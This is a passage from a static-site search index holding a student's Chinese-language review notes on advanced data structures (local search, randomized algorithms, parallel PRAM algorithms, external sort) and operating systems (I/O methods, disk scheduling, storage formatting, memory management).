T\u548cK\u8d8a\u4f4e\uff0c\u8d8a\u63a5\u8fd1\u539f\u59cb\u7684\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5</li> <li> <p>Hopfield Neural Networks</p> </li> <li> <p>\u8fed\u4ee3\u7684\u6b21\u6570\u6700\u5927\u662f\u6240\u6709\u8fb9\u6743\u91cd\u7684\u7edd\u5bf9\u503c\u4e4b\u548c</p> </li> <li>\u200b\u200b</li> <li>\u5982\u56fe\uff0c\u5c06\u9ed1\u767d\u70b9\u5316\u4e3a+1-1 \u5373\u53ef\u8ba1\u7b97\u6bcf\u4e2a\u70b9\u662f\u5426\u4e3asatisfied\uff0c\u5982\u679c\u5c0f\u4e8e0\uff0c\u5219\u662f</li> <li>\u4f2a\u591a\u9879\u5f0f\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u4e3aO\uff08EW\uff09W\u662f\u8fb9\u6743\u548c</li> <li> <p>maximum cut</p> </li> <li> <p>\u200b\u200b</p> </li> <li>\u200b\u200b</li> <li>\u6211\u4eec\u4e5f\u8981\u8003\u8651\u964d\u4f4e\u5176\u65f6\u95f4\u590d\u6742\u5ea6</li> <li>\u200b\u200b</li> <li>\u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u7684\u4f18\u5316\u8fd1\u4f3c\u6bd4\u548c\u65f6\u95f4\u590d\u6742\u5ea6\u4f1a\u53d8\u6210</li> <li>\u200b\u200b</li> <li>better local</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u968f\u673a\u5220\u4e5f\u53ef\u4ee5\u5230\u8fbe\u6700\u4f18\u89e3</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#random","title":"Random","text":"<ul> <li>Quiz 14</li> <li>HW 13</li> <li></li> <li> <p>Pr[A] \u662fA\u53d1\u751f\u6982\u7387\uff0c\\(Pr[A]+Pr[\\ \\overline{A}\\ ] = 1\\)</p> </li> <li>E[X] \u662f\u53d8\u91cfX\u7684\u671f\u671b\u503c\uff0c\u5176\u5b58\u5728\u4e0b\u56fe\u7b49\u5f0f</li> <li>\u200b\u200b</li> <li> <p>hiring problem</p> </li> <li> <p>\u5047\u8bbe\u6709\u4e00\u5bb6\u516c\u53f8\u8981\u62db\u4eba\uff0c\u4e00\u5171\u62dbN\u4e2a\u5019\u9009\u4eba\uff0c\u6bcf\u4e2a\u5019\u9009\u4eba\u9762\u8bd5\u4e4b\u540e\u4f1a\u5f97\u5230\u4e00\u4e2a\u5206\u6570\uff0c\u6211\u4eec\u5b58\u5728\u4e00\u4e2a\u7ea6\u675f\u662f\u6211\u4eec\u5fc5\u987b\u5728\u9762\u8bd5\u7ed3\u675f\u540e\u9a6c\u4e0a\u786e\u5b9a\u8981\u4e0d\u8981\u96c7\u4f63\u4ed6\uff0c\u9762\u8bd5\u7684\u82b1\u8d39\u662f\\(C_i\\)\u96c7\u4f63\u7684\u82b1\u8d39\u662f\\(C_h\\)\uff0c\u9762\u8bd5\u7684\u82b1\u8d39\u8fdc\u5c0f\u4e8e\u96c7\u4f63\uff0c\u76ee\u6807\u662f\u96c7\u4f63\u6700\u4f18\u79c0\u7684\u90a3\u4e2a\u4eba\uff0c\u4f46\u662f\u6700\u540e\u53ef\u80fd\u96c7\u4f63\u4e86M\u4e2a\u4eba</p> </li> <li>naive solution \u548c\u53d6\u6700\u5927\u503c\u4e00\u6837\u4e00\u4e2a\u4e2a\u9762\u8fc7\u6765\uff0c\u5982\u679c\u5176\u5927\u4e8e\u524d\u9762\u7684\u6700\u5927\u503c\uff0c\u5c31\u96c7\u4f63\u4ed6</li> <li>\u200b\u200b</li> <li>\u907f\u514d\u8fd9\u79cd\u6700\u574f\u60c5\u51b5\uff0c\u6211\u4eec\u91c7\u7528\u968f\u673a\u5316\uff0c\u53ef\u4ee5\u8f6c\u6362\u4e3a\u671f\u671b\u7684\u6d88\u8017\u662f \\(O(C_h*lnN+NC_i)\\)</li> <li>\u5982\u679c\u6211\u4eec\u53ea\u80fd\u96c7\u4f63\u4e00\u6b21\uff0c\u6211\u4eec\u91c7\u7528online \u7b97\u6cd5\uff0c\u8bbe\u5b9ak\u4e2a\u4eba\u90fd\u4e0d\u96c7\u4f63\uff0c\u53d6\u4ed6\u4eec\u7684\u6700\u9ad8\u5206\u6570\uff0c\u540e\u9762\u7684\u4eba\u91cc\u9762\u53ea\u8981\u6709\u4e00\u4e2a\u9ad8\u4e8e\u8fd9\u4e2a\u5206\u6570\u5c31\u96c7\u4f63</li> <li>\u8fd9\u79cd\u60c5\u5f62\u4e0b\u96c7\u4f63\u7b2ci\u4e2a\u5458\u5de5\u662f\u6700\u4f73\u5458\u5de5\u5e76\u4e14\u88ab\u96c7\u4f63\u5230\u7684\u6982\u7387\u4e3a\u200b</li> <li> <p>quickshort </p> </li> <li> <p>\u200b\u200b</p> </li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u8fd9\u9898\u7684\u610f\u601d\u5c31\u662fm\u88ab\u96c7\u4f63\uff0c\u5e76\u4e14\u4ed6\u662f\u6700\u597d\u7684</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u5b58\u5728\u9012\u63a8\u5f0f\uff0c\\(a_i\\) \u662f\u6709i\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u7684\u671f\u671b\u6b21\u6570</li> <li>\u200b\u200b</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#parallel","title":"Parallel","text":"<ul> <li>\u4e00\u4e9b\u6982\u5ff5</li> <li> <p>PRAM</p> </li> <li> <p>\u591a\u4e2a\u5904\u7406\u5668\u4e00\u4e2amemory\u7684\u6a21\u578b\uff0c\u5b9a\u4e49\u4e86EREW\uff0cCREW\uff0cCRCW</p> </li> <li> <p>WD </p> </li> <li> <p>In Work-Depth presentation, each time unit consists of a sequence of instructions to be performed concurrently; the sequence of instructions may include any number</p> </li> <li> <p>EREW \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5904\u7406\u5668\u53ef\u4ee5\u8bfb/\u5199</p> </li> <li>CREW \u591a\u8bfb\u5355\u4e00\u7684\u5199</li> <li> <p>CRCW \u5141\u8bb8\u591a\u8bfb\u591a\u5199\uff0c\u5bf9\u4e8eCRCW\u6709\u51e0\u4e2a\u89c4\u5219\u53ef\u4ee5\u9009\u62e9</p> </li> <li> <p>Arbitary rule \u968f\u673a\u9009\u4e00\u4e2a</p> </li> <li>Priority rule \u9009\u6700\u5c0fnumber</li> <li>Common rule \u53ea\u5f53\u5199\u540c\u4e00\u4e2avalue\u7684\u65f6\u5019\u624d\u5141\u8bb8\u540c\u65f6\u5199</li> <li> <p>merging</p> </li> <li> <p>\u8fd9\u91cc\u90fd\u5047\u8bbe\u4e24\u4e2a\u6570\u7ec4\u4e00\u6837\u957f</p> </li> <li>\u57fa\u7840\u7684rank\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u5143\u7d20\u5e76\u884c\u4e8c\u5206\u641c\u7d22\uff0c\u6700\u540e\u6c47\u603b\u6392\u5e8f\uff1a\u65f6\u95f4\u590d\u6742\u5ea6O(logn) \u5de5\u4f5c\u91cfO(nlogn)</li> <li>\u6b63\u5e38\u5f52\u5e76: \u90fd\u662fO(n), O(n)</li> <li>\u4f18\u5316\u5e76\u884c\uff0c\u65f6\u95f4\u590d\u6742\u5ea6/\u6df1\u5ea6 O(logn) \u5de5\u4f5c\u91cf O(n) \u5212\u5206\u7684p\u662f n/logn</li> <li> <p>summing</p> </li> <li> <p>\u6700\u7b80\u5355\u7684\u6c42\u548c\uff0c\u4f7f\u7528\u5e76\u884c\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662flogn + 2\uff0c\u51cf\u5c11\u4e86\uff0cw\uff08n\uff09\u662f2n\uff0c\u6ca1\u53d8</p> </li> <li>\u200b\u200b</li> <li> <p>prefix sum</p> </li> <li> <p>\u5148\u7b97B\uff0c\u81ea\u5e95\u5411\u4e0a</p> </li> <li>\u518d\u7b97C</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 O(logn); W(n) = O(n)</li> <li>\u200b\u200b</li> <li> <p>maximum finding</p> </li> <li> <p>\u548c\u6c42\u548c\u4e00\u6837\u5efa\u4e8c\u53c9\u6811\uff0c\u7b97B(h, i) T = O(logn) W = O(n)</p> </li> <li>\u4f7f\u7528CRCW\uff0c\u5168\u6bd4\u8f83\uff0cT=O(1) W=O(n^2)</li> <li>\u6309\\(\\sqrt{n}\\) \u5206</li> <li> <p>\u200b\u200b</p> <p>\u200d   * \u6309\u7167loglogn \u5206 \u200b   * random sampling \u5728 O(1) \u7684\u6df1\u5ea6\u548c O(n) \u7684\u5de5\u4f5c\u91cf * \u200b\u200b * work load \u4e0d\u4e00\u5b9a\u4f1a\u4e0b\u964d * \u200b\u200b * \u200b\u200b * \u53ef\u4ee5\u901a\u8fc7 random sampling \u4f18\u5316</p> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#external-sort","title":"External sort","text":"<ul> <li>\u7b80\u5355\u7684k way merge: \u4e0d\u5305\u62ec\u521d\u59cb\u5316\u7684run</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E9%94%99%E9%A2%98/","title":"\u671f\u672b\u590d\u4e60\u9519\u9898","text":"<p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u4e0a\u9898\u4e2d\u7684key\u5e94\u8be5\u662f\u6307\u53f6\u5b50\u8282\u70b9\u4e2d\u7684\u5143\u7d20\u6570\u91cf</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u7ecf\u9a8c\u5206\u4eab</p> <p>OS\u662f\u6574\u4e2a\u8f6f\u5de5\u91cc\u9762\u6700\u91cd\u91cf\u7684\u4e13\u4e1a\u8bfe\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u671f\u672b\u96be\u5ea6\u9002\u4e2d\uff0c\u5e73\u65f6\u4f5c\u4e1a\u7684\u96be\u5ea6\u4e5f\u9002\u4e2d\uff0c\u6211\u662f\u674e\u73af\u548c\u67f3\u6674\u8001\u5e08\u73ed\u7ea7\u7684\uff0c\u4e24\u4f4d\u8001\u5e08\u7b2c\u4e00\u6b21\u5f00\u8bfe\uff0c\u4f46\u662f\u975e\u5e38\u5c3d\u5fc3\u5c3d\u8d23\uff0c\u5305\u62ec\u52a9\u6559\u56e2\u961f\u4e5f\u57fa\u672c\u4e0d\u5728\u9a8c\u6536\u548c\u5e73\u65f6\u5206\u4e0a\u4e3a\u96be\u5927\u5bb6\uff0c\u6709\u5c0f\u6d4b\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5f88\u5bb9\u6613\u5c31\u80fd\u591f\u6ee1\u5206\uff0c\u63a8\u8350\u9009\u62e9~\u6211\u4e3a\u8fd9\u95e8\u8bfe\u5199\u4e86\u8f83\u4e3a\u5b8c\u6574\u7684\u8bfe\u7a0b\u7b14\u8bb0\uff0c\u5176\u4e2d\u5f88\u591a\u5730\u65b9\u53c2\u8003\u4e86\u4fee\u4f6c\u548c\u6684\u6684\u7684\u7b14\u8bb0\uff0c\u4e24\u4f4d\u524d\u8f88\u7684\u7b14\u8bb0\u90fd\u76f8\u5f53\u5b8c\u6574\uff0c\u8db3\u591f\u5927\u5bb6\u8fdb\u884c\u671f\u672b\u8865\u5929\uff0c\u800c\u6211\u7684\u7b14\u8bb0\u5728\u4e24\u4f4d\u524d\u8f88\u7684\u57fa\u7840\u4e0a\u589e\u52a0\u5b63\u6c5f\u6c11\u73ed\u7684\u5c0f\u6d4b\uff0c\u4f5c\u4e1a\u4ee5\u53ca\u738b\u9053\u4e0a\u4e00\u4e9b\u6211\u89c9\u5f97\u6bd4\u8f83\u6613\u9519\u7684\u9898\u76ee\uff0c\u5e76\u4e14\u5e94\u5bf9\u8fd9\u79cd\u5927\u8bfe\uff0c\u6709\u76f8\u5f53\u4e00\u90e8\u5206\u8001\u5e08\u4f1a\u5212\u91cd\u70b9\uff0c\u5c24\u5176\u662f\u5f53\u5e74\u51fa\u5377\u8001\u5e08\u7684\u590d\u4e60\u8bfe\uff0c\u4e00\u5b9a\u8981\u770b\u770b\uff0c\u5efa\u8bae\u5927\u5bb6\u53d1\u6325\u534f\u4f5c\u7cbe\u795e\u8fdb\u884c\u590d\u4e60\u51c6\u5907\u3002</p>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/","title":"IO + \u78c1\u76d8","text":"<ul> <li>\u78c1\u76d8\u4e2d\u7684OS\u542f\u52a8\u7684\u8fc7\u7a0b</li> <li>\u78c1\u76d8\u4e2d\u6587\u4ef6\u7cfb\u7edf\u7684\u542f\u52a8\u8fc7\u7a0b</li> <li> <p>IO</p> </li> <li> <p>DMA \u7b49\u65b9\u5f0f\u7684\u8be6\u7ec6\u8fc7\u7a0b</p> </li> </ul>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#4-io","title":"4. IO","text":""},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#41-io","title":"4.1 IO\u65b9\u5f0f","text":"<p>IO\u7684\u65b9\u5f0f\u5305\u62ec</p> <ul> <li>\u8f6e\u8be2 polling \u901a\u8fc7\u4e0d\u65ad\u67e5\u8be2\u8bbe\u5907\u5bf9\u5e94\u7684 IO controller \u4e2d\u7684\u5bc4\u5b58\u5668\u72b6\u6001\u67e5\u770b\u662f\u5426\u80fd\u591f\u8bfb\u5199</li> <li>\u4e2d\u65ad \u901a\u8fc7\u5728 interrupt-request line \u4e0a\u53d1\u51fa\u4fe1\u53f7\u6765\u901a\u77e5CPU\u54cd\u5e94\u8bbe\u5907\u7684IO\u4e8b\u4ef6</li> </ul> <p>\u4f46\u662f\u5bf9\u4e8e\u9700\u8981\u5927\u91cf\u4f20\u8f93\u7684\u8bbe\u5907\uff0c\u4e0a\u9762\u4e24\u79cd\u64cd\u4f5c\u90fd\u662f\u4f1a\u8fc7\u591a\u5730\u5360\u7528CPU\u8d44\u6e90\uff0c\u56e0\u6b64\u53c8\u6709\u4e86</p> <ul> <li> <p>DMA Direct Memory Access \u6709\u4e00\u4e2a\u4e13\u95e8\u7684DMA controller\uff0c\u8ba9DMA\u76f4\u63a5\u8bfb\u5199memory</p> </li> <li> <p>DVMA DMA\u8bfb\u5199\u7684\u662f\u865a\u62df\u5730\u5740</p> </li> </ul>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#5","title":"5. \u78c1\u76d8","text":""},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#51","title":"5.1 \u786c\u76d8","text":"<p>\u57fa\u7840\u6982\u5ff5</p> <p>hard disk \u662f\u5e38\u89c1\u7684\u4e8c\u7ea7\u5b58\u50a8\uff0c\u5176\u7ed3\u6784\u4ece\u5c0f\u5230\u5927\u5206\u522b\u662f</p> <ul> <li>\u6247\u533a sector</li> <li>\u78c1\u9053 track</li> <li>\u67f1\u9762 cylinder</li> </ul> <p>\u4e00\u4e2a\u5b8c\u6574\u7684\u76d8\u9762\u88ab\u79f0\u4e3a platter</p> <p>\u4fa7\u9762\u7684 disk arm \u4f1a\u4ee5\u6574\u4f53\u79fb\u52a8\u4e0a\u9762\u6240\u6709\u7684\u8bfb\u5199\u78c1\u5934\uff08r/w heads\uff09</p> <p>\u4ece\u78c1\u76d8\u4e0a\u8bfb\u5199\u5185\u5bb9\u7684\u8fc7\u7a0b</p> <ul> <li>\u5c06\u78c1\u5934\u79fb\u52a8\u5230\u6307\u5b9a\u67f1\u9762</li> <li>\u5c06\u78c1\u5934\u79fb\u52a8\u5230\u6307\u5b9a\u78c1\u9053</li> <li>\u78c1\u76d8\u65cb\u8f6c\u6247\u533a\u5230\u78c1\u5934\u4e0b\u65b9</li> <li>\u8bfb\u5199\u6247\u533a\u5185\u5bb9</li> </ul> <p>\u5176\u8bfb\u5199\u7684\u65f6\u95f4\u6784\u6210\u6709\u4ee5\u4e0b\u5185\u5bb9\u4f60\u90a3\u4e2a</p> <ul> <li> <p>\u5b9a\u4f4d\u65f6\u95f4 positioning time / random access time</p> </li> <li> <p>seek time \u5c06\u78c1\u5934\u79fb\u52a8\u5230\u67f1\u9762</p> </li> <li>rotational latency \u76ee\u6807\u6247\u533a\u65cb\u8f6c\u5230\u78c1\u5934\u4e0b\u65b9\uff0c\u78c1\u76d8\u8f6c\u901f\u4e00\u822c\u4e3a round per minute \u4e3a\u5355\u4f4d\uff0crotational latency = \\(\\frac{1}{2}*\\frac{1}{rpm}*60\\ s\\)</li> <li> <p>\u4f20\u8f93\u65f6\u95f4 transfer time</p> </li> <li> <p>\u6570\u636e\u5728 disk \u548c memory \u4e4b\u95f4\u4f20\u8f93\u7684\u65f6\u95f4</p> </li> </ul> <p>\u200b\u200b</p> <p>\u8c03\u5ea6</p> <p>\u5bf9\u4e8e\u8c03\u5ea6\u800c\u8a00\uff0c\u6211\u4eec\u9700\u8981\u63d0\u9ad8 disk bandwidth = \u4f20\u8f93\u6570\u636e\u91cf / \u8bf7\u6c42\u5f00\u59cb\u5230\u4f20\u8f93\u5b8c\u6210\u7684\u65f6\u95f4\u95f4\u9694</p> <p>\u5c31\u662f\u8bf4\u964d\u4f4e\u5bfb\u5740\u4e4b\u7c7b\u7684\u65f6\u95f4\uff0c\u63d0\u9ad8\u5b9e\u9645\u4f20\u8f93\u7684\u6bd4\u4f8b</p> <ul> <li>\u5f53IO\u8bf7\u6c42\u8f83\u4e3a\u7a00\u758f\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u5c31\u4e0d\u9700\u8981\u8c03\u5ea6\uff0c\u6765\u4e00\u4e2a\u5904\u7406\u4e00\u4e2a</li> <li>\u5f53IO\u8bf7\u6c42\u8f83\u4e3a\u5bc6\u96c6\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u7528\u4e00\u4e2aqueue\u6765\u7ef4\u62a4\u7b49\u5f85\u4e2d\u7684\u8bf7\u6c42\uff0c\u5e76\u4e14\u7528disk scheduling \u6765\u8c03\u6574\u8fd9\u4e9b\u8bf7\u6c42\u88ab\u5904\u7406\u7684\u987a\u5e8f</li> </ul> <p>\u5982\u4eca\u7684 disk driver \u7ed9OS\u66b4\u9732\u7684\u4e0d\u662f tracks \u548c sectors \u4e4b\u7c7b\u7684\uff0c\u800c\u662f\u63d0\u4f9b\u4e0e\u7269\u7406\u5730\u5740\u76f8\u5173\u7684 logical block address (LBA)\uff0c\u5176\u4e2d logical block \u662f\u6570\u636e\u4f20\u8f93\u7684\u6700\u5c0f\u5355\u4f4d</p> <p>FCFS</p> <p>\u5c31\u662f\u5148\u8fdb\u5148\u51faqueue\u7684\u5904\u7406\uff0c\u5176\u5b9e\u6ca1\u6709\u4f18\u5316\uff0c\u5c31\u662f\u89c4\u5b9a\u4e86\u4e00\u4e2a\u987a\u5e8f</p> <p>SSTF</p> <p>shortest seek time first \uff0c\u603b\u662f\u9009\u62e9\u8ddd\u79bb\u5f53\u524d\u78c1\u5934\u6700\u8fd1\u7684\u90a3\u4e2a\u8bf7\u6c42\u53bb\u5904\u7406</p> <p>\u597d\u5904</p> <ul> <li>\u4f4e\u5e73\u5747\u54cd\u5e94\u65f6\u95f4</li> <li>\u9ad8\u541e\u5410\u91cf</li> </ul> <p>\u574f\u5904</p> <ul> <li>\u54cd\u5e94\u65f6\u95f4\u65b9\u5dee\u8f83\u5927</li> <li>\u6709\u9965\u997f\u95ee\u9898</li> <li>\u8ba1\u7b97 seek time \u6709\u989d\u5916\u5f00\u9500</li> </ul> <p>SCAN &amp; LOOK</p> <p>\u8be5\u7b97\u6cd5\u8981\u6c42\u78c1\u5934\u5728\u78b0\u5230 LBA \u8fb9\u754c\u4e4b\u524d\u53ea\u4f1a\u5355\u5411\u79fb\u52a8\uff0c\u78b0\u5230\u4e4b\u540e\u53cd\u5411\u79fb\u52a8\uff0c\u800c\u5728\u79fb\u52a8\u7684\u8fc7\u7a0b\u4e2d\u5904\u7406\u80fd\u591f\u5904\u7406\u7684\u8bf7\u6c42</p> <p>\u597d\u5904</p> <ul> <li>\u9ad8\u541e\u5410\u91cf</li> <li>\u54cd\u5e94\u65f6\u95f4\u65b9\u5dee\u4f4e</li> <li>\u4f4e\u5e73\u5747\u54cd\u5e94\u65f6\u95f4</li> </ul> <p>\u574f\u5904</p> <ul> <li>\u7531\u4e8e\u662f\u5355\u5411\u79fb\u52a8\uff0c\u5982\u679c\u8bf7\u6c42\u5728\u78c1\u5934\u521a\u521a\u7ecf\u8fc7\u7684\u5730\u65b9\uff0c\u90a3\u4e48\u4f1a\u7b49\u5f85\u8f83\u957f\u65f6\u95f4</li> </ul> <p>\u5982\u679c\u662f\u8d70\u5230\u9760\u8fd1\u8fb9\u754c\u7684\u8bf7\u6c42\u5bf9\u5e94\u7684LBA\u5c31\u63d0\u524d\u6389\u5934\uff0c\u90a3\u4e48\u5c31\u662fLOOK\u7b97\u6cd5\uff0cSCAN\u8981\u8d70\u5230\u8fb9\u754c\uff0c\u53ef\u4ee5\u51cf\u5c11\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684SCAN</p> <p>C-SCAN &amp; C-LOOK</p> <p>C-SCAN \u5c31\u662f\u78b0\u5230\u8fb9\u754c\u4e4b\u540e\u76f4\u63a5\u8fd4\u56de\u5230\u8d77\u70b9\uff0c\u6ca1\u6709\u53cd\u5411\u79fb\u52a8\u5904\u7406\u8bf7\u6c42\u7684\u8fc7\u7a0b\uff0c\u6c38\u8fdc\u662f\u5355\u5411</p> <p>\u6bd4\u8d77 SCAN \u6709\u66f4\u5747\u5300\u7684\u7b49\u5f85\u65f6\u95f4</p> <p>\u8c03\u5ea6\u7b97\u6cd5\u7684\u9009\u62e9</p> <p>\u4e00\u822c\u6765\u8bf4\uff0cSSTF\u662f\u6bd4\u8f83\u5e38\u89c1\u7684\u9ed8\u8ba4\u9009\u62e9\uff0c\u5728IO\u9891\u7e41\u7684\u65f6\u5019\uff0c\u4f7f\u7528LOOK\u548cC-LOOK</p> <ul> <li>SSD \u4f1a\u4f7f\u7528\u5148\u6765\u5148\u670d\u52a1</li> </ul>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#52","title":"5.2 \u975e\u6613\u5931\u6027\u5185\u5b58","text":"<p>\u8fd9\u91cc\u53ea\u8ba8\u8bba NVM</p> <p>NVM\u672c\u8eab\u8bfb\u5199\u6548\u7387\u8f83\u9ad8\uff0c\u541e\u5410\u7387\u4f1a\u6536\u5230\u6807\u51c6\u603b\u7ebf\u63a5\u53e3\uff08standard bus interface\uff09\u7684\u4f20\u8f93\u901f\u7387\u4e0a\uff0c\u6240\u4ee5NVM\u5f80\u5f80\u4f1a\u76f4\u63a5\u8fde\u5230\u7cfb\u7edf\u603b\u7ebf system bus \u4e0a</p> <ul> <li>\u652f\u6301\u4ee5 page \u7684\u7c92\u5ea6\u8fdb\u884c\u8bfb\u5199\uff0c\u4f46\u662f\u4e0d\u652f\u6301\u6570\u636e\u8986\u76d6\uff0c\u9700\u8981\u5148\u64e6\u9664\u6570\u636e\u518d\u5199\u5165\u6570\u636e\uff0c\u6709\u4e00\u4e9b\u591a\u7684\u5f00\u9500</li> <li>NVM\u6709\u591a\u4e2adie\u7ec4\u6210\uff0c\u53ef\u4ee5\u5e76\u884c\u8bfb\u5199\u63d0\u9ad8\u541e\u5410\u91cf</li> <li>NAND semiconductor \u5728\u8fdb\u884c\u4e00\u5b9a\u91cf\u64e6\u9664\u64cd\u4f5c\u4e4b\u540e\u5c31\u4e0d\u518d\u80fd\u5b58\u50a8\u6570\u636e\uff0c\u56e0\u6b64\u5b58\u5728\u4f7f\u7528\u5bff\u547d</li> </ul>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#53","title":"5.3 \u5b58\u50a8\u4ecb\u8d28\u7ba1\u7406 *","text":"<p>\u65b0\u7684\u5b58\u50a8\u8bbe\u5907\u5728\u88ab\u4f7f\u7528\u4e4b\u524d\u9700\u8981\u7ecf\u8fc7\u4f4e\u7ea7\u683c\u5f0f\u5316 \uff08low-level formatting or physical formatting) \uff0c\u8fd9\u4e2a\u8fc7\u7a0b</p> <ul> <li>\u5c06\u5176\u5206\u4e3a\u63a7\u5236\u5668\u53ef\u4ee5\u8bfb\u5199\u7684\u6247\u533a</li> <li>\u521b\u5efa\u903b\u8f91\u5757\u7684\u6620\u5c04</li> <li>\u521b\u5efa\u95ea\u5b58\u8f6c\u6362\u5c42 flash translation layer (FTL)</li> </ul> <p>\u5e76\u4e14\u4f1a\u4e3a sectors \u6216 pages \u7ef4\u62a4\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u4fe1\u606f\uff0c\u5c06\u6570\u636e\u5305\u88c5\u4e3a header + data + tail \u7684\u5f62\u5f0f\uff0c\u5e76\u4e14\u5728header \u548c tailer \u91cc\u5b58\u50a8\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u4f8b\u5982\u7f16\u53f7\uff0c\u548c\u6821\u9a8c\u7801\uff0c\u7ea0\u9519\u7801\u7b49\u7b49</p> <p>\u5728\u5b8c\u6210\u4e86\u4f4e\u7ea7\u7684\u683c\u5f0f\u5316\u4e4b\u540e\uff0c\u4e3a\u4e86\u80fd\u8ba9OS\u4f7f\u7528\uff0c\u8fd8\u4f1a\u5728\u8bbe\u5907\u4e0a\u8bb0\u5f55\u4e00\u4e9bOS\u6240\u9700\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5927\u81f4\u5206\u4e3a\u4e09\u6b65</p> <ul> <li>Partition\uff1a\u5c06\u8bbe\u5907\u7684\u5b58\u50a8\u7a7a\u95f4\u505a\u4e00\u4e2a\u5212\u5206\uff0c\u6bcf\u4e00\u4e2a\u90fd\u88ab\u89c6\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u5b58\u50a8\u7a7a\u95f4\uff08logical disk\uff09\u3002\u5206\u533a\u4fe1\u606f\u4ee5\u56fa\u5b9a\u683c\u5f0f\u5199\u5165\u5b58\u50a8\u8bbe\u5907\u7684\u56fa\u5b9a\u4f4d\u7f6e</li> <li>volume creating &amp; management\uff1a\u5377\u662f\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u8fd9\u4e00\u6b65\u662f\u5212\u5b9a\u6587\u4ef6\u7cfb\u7edf\u6240\u8986\u76d6\u7684\u8303\u56f4</li> <li>logical formatting\uff1a\u5728\u5377\u4e0a\u521b\u5efa\u548c\u521d\u59cb\u5316\u6587\u4ef6\u7cfb\u7edf</li> </ul>"},{"location":"ZJU-course/OS/IO%20%2B%20%E7%A3%81%E7%9B%98/#54-raid","title":"5.4 RAID *","text":"<p>\u200d</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","title":"\u5185\u5b58\u7ba1\u7406","text":"<ul> <li>OS\u4e00\u822c\u5728\u5730\u5740\u7684\uff1f\u9ad8 / \u4f4e  \u9ad8\u5730\u5740</li> <li>\u865a\u62df\u5185\u5b58\u673a\u5236\u4e0b\u7684\u9875\u8868\u5173\u7cfb \u975e\u865a\u62df\u5730\u5740\u4e0b\u7684\u9875\u8868\u5173\u7cfb</li> <li>\u8fde\u7eed\u5206\u914d\u7684\u5176\u4ed6\u7b97\u6cd5</li> <li>\u9a7b\u7559\u96c6\u548c\u5de5\u4f5c\u96c6</li> <li>\u9a7b\u7559\u5e94\u8be5\u5927\u4e8e\u5de5\u4f5c</li> <li>swap space</li> <li>memory mapping file \u5c06\u6587\u4ef6\u5904\u7406\u8f6c\u6362\u6210\u4e86\u8bfb\u5199\u5185\u5b58</li> <li>TLB \u4e00\u6b21\u8bbf\u5b58</li> <li>\u4e00\u7ea7\u9875\u8868 \u4e24\u6b21\u8bbf\u5b58</li> <li>page fault + \u4e00\u7ea7\u9875\u8868 \u4e24\u6b21\u8bbf\u5b58 \u540e \u518d\u6267\u884c\u4e00\u6b21 \u6b64\u65f6\u7684\u5185\u5b58\u662f\u5426\u5728TLB\u4e2d\uff1f</li> </ul>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#31","title":"3.1 